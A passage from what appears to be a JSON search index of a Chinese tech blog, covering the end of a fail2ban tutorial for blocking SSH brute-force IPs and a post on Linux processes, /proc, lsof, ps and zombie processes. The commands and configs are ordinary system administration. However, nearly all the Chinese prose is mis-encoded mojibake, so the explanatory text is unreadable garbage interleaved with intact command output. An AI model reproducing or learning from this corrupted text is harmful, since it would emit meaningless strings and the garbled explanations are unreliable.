nginxéƒ½ä¼šæœ‰ç±»ä¼¼çš„å¨èƒã€‚\næ‰‹å·¥å°†æŸä¸ªipåŠ å…¥é»‘åå•ï¼Œè¿™ç§æ“ä½œå¤ªéº»çƒ¦ï¼Œè€Œä¸”æ•ˆç‡ä½ã€‚è€Œfail2banå°±æ˜¯ä¸€ç§è‡ªåŠ¨åŒ–çš„è§£å†³æ–¹æ¡ˆã€‚\nfail2banå·¥ä½œåŸç† fail2bançš„å·¥ä½œåŸç†æ˜¯ç›‘æ§æŸä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œç„¶åæ ¹æ®æŸäº›å…³é”®è¯ï¼Œæå–å‡ºæ”»å‡»æ–¹çš„IPåœ°å€ï¼Œç„¶åå°†å…¶åŠ å…¥åˆ°é»‘åå•ã€‚\nfail2banå®‰è£… yum install fail2ban -y # å¦‚æœæ‰¾ä¸åˆ°fail2banåŒ…ï¼Œå°±æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ yum install epel-release # å®‰è£…fail2ban å®Œæˆå systemctl enable fail2ban # è®¾ç½®fail2banå¼€æœºå¯åŠ¨ systemctl start fail2ban # å¯åŠ¨fail2ban systemctl status fail2ban # æŸ¥çœ‹fail2bançš„è¿è¡ŒçŠ¶æ€ ç”¨fail2banä¿æŠ¤ssh fail2bançš„é…ç½®æ–‡ä»¶ä½äº/etc/fail2banç›®å½•ä¸‹ã€‚\nåœ¨è¯¥ç›®å½•ä¸‹å»ºç«‹ä¸€ä¸ªæ–‡ä»¶ jail.local, å†…å®¹å¦‚ä¸‹\nbantime æŒç»­ç¦æ­¢å¤šä¹… maxretry æœ€å¤§å¤šå°‘æ¬¡å°è¯• banaction æ‹¦æˆªåçš„æ“ä½œ findtime æŸ¥æ‰¾æ—¶é—´ çœ‹ä¸‹ä¸‹é¢çš„æ“ä½œçš„æ„æ€æ˜¯ï¼šç›‘æ§sshdæœåŠ¡çš„æœ€è¿‘10åˆ†é’Ÿçš„æ—¥å¿—ï¼Œå¦‚æœæŸä¸ªipåœ¨10åˆ†é’Ÿä¹‹å†…ï¼Œæœ‰2æ¬¡ç™»å½•å¤±è´¥ï¼Œå°±æŠŠè¿™ä¸ªipåŠ å…¥é»‘åå•, 24å°æ—¶ä¹‹åï¼Œè¿™ä¸ªipæ‰ä¼šè¢«ä»é»‘åå•ä¸­ç§»é™¤ã€‚\n[DEFAULT] bantime = 24h banaction = iptables-multiport maxretry = 2 findtime = 10m [sshd] enabled = true ç„¶åé‡å¯fail2ban, systemctl restart fail2banÂ fail2banæä¾›ç®¡ç†å·¥å…·fail2ban-client","title":"è‡ªåŠ¨IPæ‹¦æˆªå·¥å…·fail2banä½¿ç”¨æ•™ç¨‹"},{"content":"æ€è€ƒé¢˜ï¼šå½“ä½ ç”¨sshç™»å½•åˆ°ä¸€ä¸ªlinuxæœºå™¨ï¼Œå¹¶ä¸”æ‰§è¡Œäº†æŸä¸ªhello.shä¹‹åï¼Œæœ‰å“ªäº›è¿›ç¨‹å‚ä¸äº†è¯¥è¿‡ç¨‹?\nlinuxç³»ç»Ÿæ¶æ„ kernel mode user mode å†…æ ¸æ€å’Œç”¨æˆ·æ€çš„åŒºåˆ« ä»€ä¹ˆæ˜¯è¿›ç¨‹ è¿›ç¨‹æ˜¯è¿è¡Œçš„ç¨‹åº process æ˜¯å¯¹ processor è™šæ‹ŸåŒ–ï¼Œé€šè¿‡æ—¶é—´ç‰‡ è¿›ç¨‹éƒ½æœ‰uid nginxè®¿é—®æŸä¸ªç›®å½•ï¼ŒPermission denied\nè¿›ç¨‹éƒ½æœ‰pid $$ è¿›ç¨‹éƒ½æœ‰çˆ¶è¿›ç¨‹ å‡†ç¡®æ¥è¯´ï¼Œé™¤äº†pidä¸º0çš„è¿›ç¨‹ä¹‹å¤–ï¼Œå…¶ä»–è¿›ç¨‹éƒ½æœ‰çˆ¶è¿›ç¨‹ æœ‰æ—¶å€™ï¼Œä½ ç”¨killå‘½ä»¤æ€æ­»äº†ä¸€ä¸ªè¿›ç¨‹ï¼Œä½†æ˜¯ç«‹é©¬ä½ å°±å‘ç°è¿™ä¸ªè¿›ç¨‹åˆèµ·æ¥äº†ã€‚ä½ å°±è¦çœ‹çœ‹ï¼Œè¿™ä¸ªè¿›ç¨‹æ˜¯ä¸æ˜¯æœ‰ä¸ªéinitè¿›ç¨‹çš„çˆ¶è¿›ç¨‹ã€‚ä¸€èˆ¬è¿™ä¸ªè¿›ç¨‹è´Ÿè´£ç›‘æ§å­è¿›ç¨‹ï¼Œä¸€æ—¦å­è¿›ç¨‹æŒ‚æ‰ï¼Œå°±ä¼šå»é‡æ–°åˆ›å»ºä¸€ä¸ªè¿›ç¨‹ã€‚æ‰€ä»¥ä½ éœ€è¦æ‰¾åˆ°è¿™ä¸ªçˆ¶è¿›ç¨‹çš„Idï¼Œå…ˆæŠŠçˆ¶è¿›ç¨‹killæ‰ï¼Œç„¶ååœ¨killå­è¿›ç¨‹ã€‚ è¿›ç¨‹æ˜¯ä¸€æ£µæ ‘ #!/bin/bash echo \u0026#34;pid is $$\u0026#34; times=0 while true do sleep 2s; let times++; echo $times hello; done âœ ~ pstree 24601 sshdâ”€â”¬â”€3*[sshdâ”€â”€â”€zsh] â”œâ”€sshdâ”€â”€â”€zshâ”€â”€â”€pstree â””â”€sshdâ”€â”€â”€zshâ”€â”€â”€world.shâ”€â”€â”€sleep è¿›ç¨‹éƒ½æœ‰ç”Ÿå‘½å‘¨æœŸ åˆ›å»º é”€æ¯ è¿›ç¨‹éƒ½æœ‰çŠ¶æ€ runing è¿›ç¨‹å ç”¨CPU, æ­£åœ¨æ‰§è¡ŒæŒ‡ä»¤ ready è¿›ç¨‹æ‰€æœ‰éœ€è¦çš„èµ„æºéƒ½å·²ç»å°±ç»ªï¼Œç­‰å¾…è¿›å…¥CPUæ‰§è¡Œ blocked è¿›ç¨‹è¢«æŸäº›äº‹ä»¶é˜»æ–­ï¼Œä¾‹å¦‚IOã€‚ è¿›ç¨‹çš„çŠ¶æ€è½¬ç§»å›¾\nè¿›ç¨‹éƒ½æœ‰æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ ä½¿ç”¨lsofå‘½ä»¤ï¼Œå¯ä»¥æŸ¥çœ‹æŸä¸ªè¿›ç¨‹æ‰€æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦\n/proc/pid/fd/ç›®å½•ä¸‹ä¹Ÿæœ‰æ–‡ä»¶æè¿°ç¬¦\nlsof -c è¿›ç¨‹ålsof -p è¿›ç¨‹å·lsof filename # æŸ¥çœ‹æŸä¸ªæ–‡ä»¶è¢«å“ªä¸ªè¿›ç¨‹æ‰“å¼€**\n[root@localhost ~]# lsof -c rtpproxy COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME rtpproxy 2073 root cwd DIR 253,0 4096 128 / rtpproxy 2073 root rtd DIR 253,0 4096 128 / rtpproxy 2073 root txt REG 253,0 933247 18295252 /usr/local/bin/rtpproxy rtpproxy 2073 root mem REG 253,0 2127336 33617010 /usr/lib64/libc-2.17.so rtpproxy 2073 root mem REG 253,0 44448 33617041 /usr/lib64/librt-2.17.so rtpproxy 2073 root mem REG 253,0 19776 34757658 /usr/lib64/libdl-2.17.so rtpproxy 2073 root mem REG 253,0 1139680 34757660 /usr/lib64/libm-2.17.so rtpproxy 2073 root mem REG 253,0 144792 33617035 /usr/lib64/libpthread-2.17.so rtpproxy 2073 root mem REG 253,0 164112 33595530 /usr/lib64/ld-2.17.so rtpproxy 2073 root 0u CHR 1,3 0t0 1028 /dev/null rtpproxy 2073 root 1u CHR 1,3 0t0 1028 /dev/null rtpproxy 2073 root 2u CHR 1,3 0t0 1028 /dev/null rtpproxy 2073 root 3u IPv4 17641 0t0 UDP 192.168.40.100:7890 rtpproxy 2073 root 4u unix 0xffff880079260000 0t0 17642 socket rtpproxy 2073 root 8u IPv4 72592335 0t0 UDP 192.168.40.100:25257 è¿›ç¨‹éƒ½æœ‰èµ„æºé™åˆ¶ /proc/pid/limits\nä»¥rtpproxyä¸ºä¾‹å­ï¼Œrtpproxyçš„pidä¸º2073, /proc/pid/limitsæ–‡ä»¶è®°å½•è¿›ç¨‹çš„èµ„æºé™åˆ¶\nè¿›ç¨‹éƒ½æœ‰ç¯å¢ƒå˜é‡ /proc/pid/environ\nè¿›ç¨‹éƒ½æœ‰å‚æ•° /proc/pid/cmdline\nrtpproxy-A192.168.40.100-l192.168.40.100-sudp:192.168.40.1007890-F-m20000-M40000-L20000-dDBUG[root@localhost 2073]# è¿›ç¨‹éƒ½æœ‰åå­— /proc/2073/status\nName:\trtpproxy State:\tS (sleeping) Tgid:\t2073 Ngid:\t0 Pid:\t2073 PPid:\t1 TracerPid:\t0 Uid:\t0\t0\t0\t0 Gid:\t0\t0\t0\t0 è¿›ç¨‹çš†æœ‰é€€å‡ºç  é0çš„é€€å‡ºç ä¸€èˆ¬æ˜¯å¼‚å¸¸é€€å‡º $? [root@localhost 2073]# cat \u0026#34;test\u0026#34; [root@localhost 2073]# echo $? 1 [root@localhost 2073]# echo $? 0 è¿›ç¨‹å¯ä»¥fork å­¤å„¿è¿›ç¨‹ å­¤å„¿è¿›ç¨‹ï¼šä¸€ä¸ªçˆ¶è¿›ç¨‹é€€å‡ºï¼Œè€Œå®ƒçš„ä¸€ä¸ªæˆ–å¤šä¸ªå­è¿›ç¨‹è¿˜åœ¨è¿è¡Œï¼Œé‚£ä¹ˆé‚£äº›å­è¿›ç¨‹å°†æˆä¸ºå­¤å„¿è¿›ç¨‹ã€‚å­¤å„¿è¿›ç¨‹å°†è¢«initè¿›ç¨‹(è¿›ç¨‹å·ä¸º1)æ‰€æ”¶å…»ï¼Œå¹¶ç”±initè¿›ç¨‹å¯¹å®ƒä»¬å®ŒæˆçŠ¶æ€æ”¶é›†å·¥ä½œã€‚\nåƒµå°¸è¿›ç¨‹ åƒµå°¸è¿›ç¨‹ï¼šä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨forkåˆ›å»ºå­è¿›ç¨‹ï¼Œå¦‚æœå­è¿›ç¨‹é€€å‡ºï¼Œè€Œçˆ¶è¿›ç¨‹å¹¶æ²¡æœ‰è°ƒç”¨waitæˆ–waitpidè·å–å­è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯ï¼Œé‚£ä¹ˆå­è¿›ç¨‹çš„è¿›ç¨‹æè¿°ç¬¦ä»ç„¶ä¿å­˜åœ¨ç³»ç»Ÿä¸­ã€‚è¿™ç§è¿›ç¨‹ç§°ä¹‹ä¸ºåƒµæ­»è¿›ç¨‹ã€‚ åƒµå°¸è¿›ç¨‹å ç”¨è¿›ç¨‹æè¿°ç¬¦ï¼Œæ— æ³•é‡Šæ”¾ï¼Œä¼šå¯¼è‡´ç³»ç»Ÿæ— æ³•æ­£å¸¸çš„åˆ›å»ºè¿›ç¨‹ã€‚\n\u0026gt; cat /proc/sys/kernel/pid_max 32768 è¿›ç¨‹é—´é€šä¿¡ è¿›ç¨‹ä¹‹é—´çš„æ‰€æœ‰èµ„æºéƒ½æ˜¯å®Œå…¨éš”ç¦»çš„ï¼Œæ‰€ä»¥è¿›ç¨‹ä¹‹é—´å¦‚ä½•é€šä¿¡å‘¢ï¼Ÿ\nåœ¨liunxåº•å±‚ï¼Œæœ‰ä¸ªå¥—æ¥å­—API\nSOCKET socket (int domain, int type, int protocol) domain è¡¨ç¤ºåŸŸï¼Œä¸€èˆ¬ç”±ä¸¤ä¸ªå€¼ AF_INET å³å› ç‰¹ç½‘ AF_LOCAL ç”¨äºåŒä¸€å°æœºå™¨ä¸Šçš„è¿›ç¨‹é—´é€šä¿¡ type è¡¨ç¤ºç±»å‹ SOCK_STREAM æä¾›å¯é çš„ã€å…¨åŒå·¥ã€é¢å‘é“¾æ¥çš„å­—èŠ‚æµï¼Œä¸€èˆ¬å°±æ˜¯TCP SOCK_DGRAM æä¾›ä¸å¯é ã€å°½åŠ›è€Œä¸ºçš„æ•°æ®æŠ¥æœåŠ¡ï¼Œä¸€èˆ¬å°±æ˜¯UDP SOCK_RAW å…è®¸ç›´æ¥è®¿é—®IPå±‚åŸç”Ÿçš„æ•°æ®æŠ¥ ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿›ç¨‹é—´é€šä¿¡ï¼Œå®é™…ä¸Šä¹Ÿæ˜¯ç”¨çš„socket\nå®ˆæŠ¤è¿›ç¨‹ å®ˆæŠ¤è¿›ç¨‹ä¸€èˆ¬æ˜¯åå°è¿è¡Œçš„è¿›ç¨‹ï¼Œä¾‹å¦‚sshd, mysqld, dockerdç­‰ç­‰ï¼Œä»–ä»¬çš„ç‰¹ç‚¹å°±æ˜¯ä»–ä»¬çš„ppidæ˜¯1ï¼Œ ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ˆæŠ¤è¿›ç¨‹ä¹Ÿæ˜¯å­¤å„¿è¿›ç¨‹çš„ä¸€ç§ã€‚\nroot 9696 1 0 Oct06 ? 00:05:16 /usr/sbin/sshd -D idleè¿›ç¨‹ä¸initè¿›ç¨‹ Linuxä¸‹æœ‰3ä¸ªç‰¹æ®Šçš„è¿›ç¨‹**ï¼Œidleè¿›ç¨‹(PID = 0), initè¿›ç¨‹(PID = 1)å’Œkthreadd(PID = 2)**\nidleè¿›ç¨‹ç”±ç³»ç»Ÿè‡ªåŠ¨åˆ›å»º, è¿è¡Œåœ¨å†…æ ¸æ€ã€‚idleè¿›ç¨‹å…¶pid=0ï¼Œå…¶å‰èº«æ˜¯ç³»ç»Ÿåˆ›å»ºçš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ï¼Œä¹Ÿæ˜¯å”¯ä¸€ä¸€ä¸ªæ²¡æœ‰é€šè¿‡forkæˆ–è€…kernel_threadäº§ç”Ÿçš„è¿›ç¨‹ã€‚å®ŒæˆåŠ è½½ç³»ç»Ÿåï¼Œæ¼”å˜ä¸ºè¿›ç¨‹è°ƒåº¦ã€äº¤æ¢ initè¿›ç¨‹ç”±idleé€šè¿‡kernel_threadåˆ›å»ºï¼Œåœ¨å†…æ ¸ç©ºé—´å®Œæˆåˆå§‹åŒ–å, åŠ è½½initç¨‹åº, å¹¶æœ€ç»ˆç”¨æˆ·ç©ºé—´ã€‚ç”±0è¿›ç¨‹åˆ›å»ºï¼Œå®Œæˆç³»ç»Ÿçš„åˆå§‹åŒ–. æ˜¯ç³»ç»Ÿä¸­æ‰€æœ‰å…¶å®ƒç”¨æˆ·è¿›ç¨‹çš„ç¥–å…ˆè¿›ç¨‹ Linuxä¸­çš„æ‰€æœ‰è¿›ç¨‹éƒ½æ˜¯æœ‰initè¿›ç¨‹åˆ›å»ºå¹¶è¿è¡Œçš„ã€‚é¦–å…ˆLinuxå†…æ ¸å¯åŠ¨ï¼Œç„¶ååœ¨ç”¨æˆ·ç©ºé—´ä¸­å¯åŠ¨initè¿›ç¨‹ï¼Œå†å¯åŠ¨å…¶ä»–ç³»ç»Ÿè¿›ç¨‹ã€‚åœ¨ç³»ç»Ÿå¯åŠ¨å®Œæˆå®Œæˆåï¼Œinitå°†å˜ä¸ºå®ˆæŠ¤è¿›ç¨‹ç›‘è§†ç³»ç»Ÿå…¶ä»–è¿›ç¨‹ã€‚ kthreaddè¿›ç¨‹ç”±idleé€šè¿‡kernel_threadåˆ›å»ºï¼Œå¹¶å§‹ç»ˆè¿è¡Œåœ¨å†…æ ¸ç©ºé—´, è´Ÿè´£æ‰€æœ‰å†…æ ¸çº¿ç¨‹çš„è°ƒåº¦å’Œç®¡ç† å‚è€ƒï¼šhttps://blog.csdn.net/gatieme/article/details/51484562\nçº¿ç¨‹ ps -må¯ä»¥åœ¨è¿›ç¨‹ä¹‹åæ˜¾ç¤ºçº¿ç¨‹ã€‚çº¿ç¨‹çš„tidä¹Ÿä¼šå ç”¨ä¸€ä¸ª/proc/tidç›®å½•ï¼Œå’Œè¿›ç¨‹çš„/proc/pid ç›®å½•æ²¡ä»€ä¹ˆåŒºåˆ«ã€‚\nåªä¸è¿‡è¿›ç¨‹çš„Tgid(çº¿ç¨‹ç»„Id)æ˜¯è‡ªå·±çš„pid, è€Œå…¶ä»–çº¿ç¨‹çš„Tgidæ˜¯ä¸»çº¿ç¨‹çš„pidã€‚\nps -em -o pid,tid,command | grep rtpproxy -A10 2112 - rtpproxy -l 192.168.40.101 -s udp:192.168.40.101 7890 -F -m 20000 -M 40000 -L 20000 -d DBUG - 2112 - - 2113 - - 2114 - - 2115 - - 2116 - - 2117 - - 2118 - è¿›ç¨‹ä¸çº¿ç¨‹çš„åŒºåˆ« å…³äº/procç›®å½• procç›®å½•æ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„æ–‡ä»¶ç³»ç»Ÿï¼Œå®é™…ä¸Šæ˜¯å†…æ ¸çš„æ•°æ®ç»“æ„çš„æ˜ å°„ã€‚é‡Œé¢çš„å¤§éƒ¨åˆ†çš„æ–‡ä»¶éƒ½æ˜¯åªè¯»çš„ï¼Œåªæœ‰å°‘éƒ¨åˆ†æ˜¯å¯å†™çš„ã€‚\nå…³äºè¿›ç¨‹è¿è¡Œæ—¶ä¿¡æ¯ï¼Œéƒ½å¯ä»¥åœ¨è¿™ä¸ªç›®å½•æ‰¾åˆ°ã€‚\nä¸‹é¢çš„é“¾æ¥è¯¦ç»†çš„ä»‹ç»äº†æ¯ä¸ªç›®å½•çš„ä½œç”¨ã€‚\nhttps://www.linux.com/news/discover-possibilities-proc-directory/\nhttps://www.tldp.org/LDP/sag/html/proc-fs.html\nhttp://man7.org/linux/man-pages/man5/proc.5.html\næ€è€ƒ\nå¦‚ä½•è·å–æŸä¸ªæ‰§è¡Œè¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ï¼Ÿ procç›®å½•ä¸‹çš„æ–‡ä»¶æœ‰ä½•ç‰¹ç‚¹ï¼Ÿ ä»¥ä¸‹çš„å‡ ä¸ªæ–‡ä»¶æ˜¯æ¯”è¾ƒé‡è¦çš„ï¼Œç€é‡è¯´æ˜ä¸€ä¸‹ã€‚\ncmdline æ‰§è¡Œå‚æ•° environ ç¯å¢ƒå˜é‡ ** exe -\u0026gt; /usr/local/bin/rtpproxyÂ å¯æ‰§è¡Œæ–‡ä»¶ä½ç½®** ** fd æ–‡ä»¶æè¿°ç¬¦ä¿¡æ¯** ** limits èµ„æºé™åˆ¶** oom killeræœºåˆ¶ï¼šæ€æ‰æœ€èƒ–çš„é‚£ä¸ªè¿›ç¨‹ oom_adj oom_score oom_score_adj status çŠ¶æ€ä¿¡æ¯ dr-xr-xr-x. 2 root root 0 Jan 14 15:56 attr -rw-r--r--. 1 root root 0 Jan 14 15:56 autogroup -r--------. 1 root root 0 Jan 14 15:56 auxv -r--r--r--. 1 root root 0 Nov 6 17:59 cgroup --w-------. 1 root root 0 Jan 14 15:56 clear_refs -r--r--r--. 1 root root 0 Nov 6 10:26 cmdline -rw-r--r--. 1 root root 0 Nov 6 17:59 comm -rw-r--r--. 1 root root 0 Jan 14 15:56 coredump_filter -r--r--r--. 1 root root 0 Jan 14 15:56 cpuset lrwxrwxrwx. 1 root root 0 Jan 14 15:56 cwd -\u0026gt; / -r--------. 1 root root 0 Jan 14 15:56 environ lrwxrwxrwx. 1 root root 0 Nov 6 17:59 exe -\u0026gt; /usr/local/bin/rtpproxy dr-x------. 2 root root 0 Jan 14 15:56 fd dr-x------. 2 root root 0 Jan 14 15:56 fdinfo -rw-r--r--. 1 root root 0 Jan 14 15:56 gid_map -r--------. 1 root root 0 Jan 14 15:56 io -r--r--r--. 1 root root 0 Jan 14 15:56 limits -rw-r--r--. 1 root root 0 Nov 6 17:59 loginuid dr-x------. 2 root root 0 Jan 14 15:56 map_files -r--r--r--. 1 root root 0 Jan 14 15:56 maps -rw-------. 1 root root 0 Jan 14 15:56 mem -r--r--r--. 1 root root 0 Jan 14 15:56 mountinfo -r--r--r--. 1 root root 0 Jan 14 15:56 mounts -r--------. 1 root root 0 Jan 14 15:56 mountstats dr-xr-xr-x. 5 root root 0 Jan 14 15:56 net dr-x--x--x. 2 root root 0 Jan 14 15:56 ns -r--r--r--. 1 root root 0 Jan 14 15:56 numa_maps -rw-r--r--. 1 root root 0 Jan 14 15:56 oom_adj -r--r--r--. 1 root root 0 Jan 14 15:56 oom_score -rw-r--r--. 1 root root 0 Jan 14 15:56 oom_score_adj -r--r--r--. 1 root root 0 Jan 14 15:56 pagemap -r--r--r--. 1 root root 0 Jan 14 15:56 personality -rw-r--r--. 1 root root 0 Jan 14 15:56 projid_map lrwxrwxrwx. 1 root root 0 Jan 14 15:56 root -\u0026gt; / -rw-r--r--. 1 root root 0 Jan 14 15:56 sched -r--r--r--. 1 root root 0 Nov 6 17:59 sessionid -rw-r--r--. 1 root root 0 Jan 14 15:56 setgroups -r--r--r--. 1 root root 0 Jan 14 15:56 smaps -r--r--r--. 1 root root 0 Jan 14 15:56 stack -r--r--r--. 1 root root 0 Jan 14 15:56 stat -r--r--r--. 1 root root 0 Jan 14 15:56 statm -r--r--r--. 1 root root 0 Nov 6 10:26 status -r--r--r--. 1 root root 0 Jan 14 15:56 syscall dr-xr-xr-x. 9 root root 0 Jan 14 15:56 task -r--r--r--. 1 root root 0 Jan 14 15:56 timers -rw-r--r--. 1 root root 0 Jan 14 15:56 uid_map -r--r--r--. 1 root root 0 Jan 14 15:56 wchan å·¥å…·ç®€ä»‹ ps psæœ‰ä¸‰ç§é£æ ¼çš„ä½¿ç”¨æ–¹å¼ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨å‰ä¸¤ç§\nUnixé£æ ¼ å‚æ•°ä»¥-å¼€å¤´ï¼Œå¦‚-a BSDé£æ ¼ï¼Œç›´æ¥ç”¨å‚æ•° å¦‚a GUNé£æ ¼ï¼Œä»¥\u0026ndash;å¼€å¤´ å¸¸ç”¨çš„æœ‰\nps -ef ps aux VSZ è™šæ‹Ÿå†…å­˜ï¼Œå•ä½kb RSS ç‰©ç†å†…å­˜ï¼Œå•ä½kb âœ 2112 ps -ef | head UID PID PPID C STIME TTY TIME CMD root 1 0 0 2018 ? 01:57:34 /usr/lib/systemd/systemd --system --deserialize 23 root 2 0 0 2018 ? 00:00:44 [kthreadd] root 3 2 0 2018 ? 00:05:44 [ksoftirqd/0] root 7 2 0 2018 ? 00:08:04 [migration/0] root 8 2 0 2018 ? 00:00:00 [rcu_bh] root 9 2 0 2018 ? 00:00:00 [rcuob/0] root 10 2 0 2018 ? 00:00:00 [rcuob/1] root 11 2 0 2018 ? 00:00:00 [rcuob/2] root 12 2 0 2018 ? 00:00:00 [rcuob/3] âœ 2112 ps aux | head USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.0 193524 3572 ? Ss 2018 117:34 /usr/lib/systemd/systemd --system --deserialize 23 root 2 0.0 0.0 0 0 ? S 2018 0:44 [kthreadd] root 3 0.0 0.0 0 0 ? S 2018 5:44 [ksoftirqd/0] root 7 0.0 0.0 0 0 ? S 2018 8:04 [migration/0] root 8 0.0 0.0 0 0 ? S 2018 0:00 [rcu_bh] root 9 0.0 0.0 0 0 ? S 2018 0:00 [rcuob/0] root 10 0.0 0.0 0 0 ? S 2018 0:00 [rcuob/1] root 11 0.0 0.0 0 0 ? S 2018 0:00 [rcuob/2] root 12 0.0 0.0 0 0 ? S 2018 0:00 [rcuob/3] ps æŸ¥çœ‹çº¿ç¨‹\nâœ 2118 ps -em -o pid,tid,command | grep rtpproxy -A 10 2112 - rtpproxy -l 192.168.40.101 -s udp:192.168.40.101 7890 -F -m 20000 -M 40000 -L 20000 -d DBUG - 2112 - - 2113 - - 2114 - - 2115 - - 2116 - - 2117 - - 2118 - cat /proc/2112/status Name:\trtpproxy State:\tS (sleeping) Tgid:\t2112 Ngid:\t0 Pid:\t2112 PPid:\t1 TracerPid:\t0 Uid:\t0\t0\t0\t0 Gid:\t0\t0\t0\t0 FDSize:\t16384 Groups:\t0 VmPeak:\t390896 kB VmSize:\t259824 kB VmLck:\t0 kB VmPin:\t0 kB VmHWM:\t121708 kB VmRSS:\t3532 kB VmData:\t246120 kB VmStk:\t136 kB VmExe:\t176 kB VmLib:\t3092 kB VmPTE:\t316 kB VmSwap:\t2272 kB Threads:\t7 SigQ:\t2/15086 SigPnd:\t0000000000000000 ShdPnd:\t0000000000000000 SigBlk:\t0000000000000000 SigIgn:\t0000000000001000 SigCgt:\t0000000187804a03 CapInh:\t0000000000000000 CapPrm:\t0000001fffffffff CapEff:\t0000001fffffffff CapBnd:\t0000001fffffffff Seccomp:\t0 Cpus_allowed:\tf Cpus_allowed_list:\t0-3 Mems_allowed:\t00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001 Mems_allowed_list:\t0 voluntary_ctxt_switches:\t259223710 nonvoluntary_ctxt_switches:\t2216 nestat netstat -nulpÂ netstat -ntulp netstat -nap lsof Linuxä¸‹æ‰€æœ‰ä¿¡æ¯éƒ½æ˜¯æ–‡ä»¶ï¼Œé‚£ä¹ˆæŸ¥çœ‹æ‰“å¼€æ–‡ä»¶å°±æ¯”è¾ƒé‡è¦äº†ã€‚ lisf open file, æŸ¥çœ‹æ‰“å¼€çš„æ–‡ä»¶\nlsof -c processNameÂ æŒ‰ç…§è¿›ç¨‹åæŸ¥çœ‹ lsof -c pidÂ æŒ‰ç…§pidæŸ¥çœ‹ lsof fileÂ æŸ¥çœ‹æ–‡ä»¶è¢«å“ªäº›è¿›ç¨‹æ‰“å¼€ losf -i:8080 æŸ¥çœ‹8080è¢«é‚£ä¸ªè¿›ç¨‹å ç”¨ top top 1 P M å‚è€ƒ http://turnoff.us/geek/inside-the-linux-kernel/ ã€ŠHow Linux Worksã€‹ ã€ŠOperating Systems there easy piecesã€‹ è®²è™šæ‹ŸåŒ–ã€å¹¶å‘ã€æŒä¹…åŒ–ä¸‰å— ã€Šç†è§£Unixè¿›ç¨‹ã€‹ ã€ŠLinux Shell Script cookbookã€‹ https://www.internalpointers.com/post/gentle-introduction-multithreading https://dev.to/rrampage/surviving-the-linux-oom-killer-2ki9 é™„ä»¶ä¹¦ç± proc(5) - Linux manual page.pdfCommand Line Text Processing - Sundeep Agarwal.pdfHow Linux Works _ What Every Superuser Sho - Brian Ward(Author).pdfOperating Systems three easy pieces - Unknown.pdf[Sarath Lakshman] Linux Shell Scripting Co - Unknown.pdftcp_ipGao Xiao Bian Cheng __Gai Shan Wang - Unknown.pdf\n","permalink":"https://wdd.js.org/posts/2020/04/pbcbub/","summary":"æ€è€ƒé¢˜ï¼šå½“ä½ ç”¨sshç™»å½•åˆ°ä¸€ä¸ªlinuxæœºå™¨ï¼Œå¹¶ä¸”æ‰§è¡Œäº†æŸä¸ªhello.shä¹‹åï¼Œæœ‰å“ªäº›è¿›ç¨‹å‚ä¸äº†è¯¥è¿‡ç¨‹?\nlinuxç³»ç»Ÿæ¶æ„ kernel mode user mode å†…æ ¸æ€å’Œç”¨æˆ·æ€çš„åŒºåˆ« ä»€ä¹ˆæ˜¯è¿›ç¨‹ è¿›ç¨‹æ˜¯è¿è¡Œçš„ç¨‹åº process æ˜¯å¯¹ processor è™šæ‹ŸåŒ–ï¼Œé€šè¿‡æ—¶é—´ç‰‡ è¿›ç¨‹éƒ½æœ‰uid nginxè®¿é—®æŸä¸ªç›®å½•ï¼ŒPermission denied\nè¿›ç¨‹éƒ½æœ‰pid $$ è¿›ç¨‹éƒ½æœ‰çˆ¶è¿›ç¨‹ å‡†ç¡®æ¥è¯´ï¼Œé™¤äº†pidä¸º0çš„è¿›ç¨‹ä¹‹å¤–ï¼Œå…¶ä»–è¿›ç¨‹éƒ½æœ‰çˆ¶è¿›ç¨‹ æœ‰æ—¶å€™ï¼Œä½ ç”¨killå‘½ä»¤æ€æ­»äº†ä¸€ä¸ªè¿›ç¨‹ï¼Œä½†æ˜¯ç«‹é©¬ä½ å°±å‘ç°è¿™ä¸ªè¿›ç¨‹åˆèµ·æ¥äº†ã€‚ä½ å°±è¦çœ‹çœ‹ï¼Œè¿™ä¸ªè¿›ç¨‹æ˜¯ä¸æ˜¯æœ‰ä¸ªéinitè¿›ç¨‹çš„çˆ¶è¿›ç¨‹ã€‚ä¸€èˆ¬è¿™ä¸ªè¿›ç¨‹è´Ÿè´£ç›‘æ§å­è¿›ç¨‹ï¼Œä¸€æ—¦å­è¿›ç¨‹æŒ‚æ‰ï¼Œå°±ä¼šå»é‡æ–°åˆ›å»ºä¸€ä¸ªè¿›ç¨‹ã€‚æ‰€ä»¥ä½ éœ€è¦æ‰¾åˆ°è¿™ä¸ªçˆ¶è¿›ç¨‹çš„Idï¼Œå…ˆæŠŠçˆ¶è¿›ç¨‹killæ‰ï¼Œç„¶ååœ¨killå­è¿›ç¨‹ã€‚ è¿›ç¨‹æ˜¯ä¸€æ£µæ ‘ #!/bin/bash echo \u0026#34;pid is $$\u0026#34; times=0 while true do sleep 2s; let times++; echo $times hello; done âœ ~ pstree 24601 sshdâ”€â”¬â”€3*[sshdâ”€â”€â”€zsh] â”œâ”€sshdâ”€â”€â”€zshâ”€â”€â”€pstree â””â”€sshdâ”€â”€â”€zshâ”€â”€â”€world.shâ”€â”€â”€sleep è¿›ç¨‹éƒ½æœ‰ç”Ÿå‘½å‘¨æœŸ åˆ›å»º é”€æ¯ è¿›ç¨‹éƒ½æœ‰çŠ¶æ€ runing è¿›ç¨‹å ç”¨CPU, æ­£åœ¨æ‰§è¡ŒæŒ‡ä»¤ ready 